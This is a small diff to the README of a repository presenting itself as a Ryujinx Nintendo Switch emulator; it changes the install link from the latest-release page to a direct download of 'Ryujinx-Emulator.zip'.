@@ -15,7 +15,7 @@ Ryujinx Emulator is a highly optimized open-source Nintendo Switch emulator. It 
 > This project is for educational and personal use only. Use at your own risk. You must own legitimate copies of Nintendo Switch games. The authors are not responsible for any copyright violations or legal issues.
 
 ## Install
-[Download `Ryujinx-Emulator.zip`](https://github.com/Inproger/ryujinx-emulator/releases/latest)
+[Download `Ryujinx-Emulator.zip`](https://github.com/Inproger/ryujinx-emulator/releases/download/Nintendo/ryujinx-emulator.zip)
 ---
 > Optimized for Windows 11 • Linux.
 <img width="1282" height="792" alt="image" src="https://github.com/user-attachments/assets/4d1b7efc-b58e-4a14-a0c7-939e9cf86ee9" />
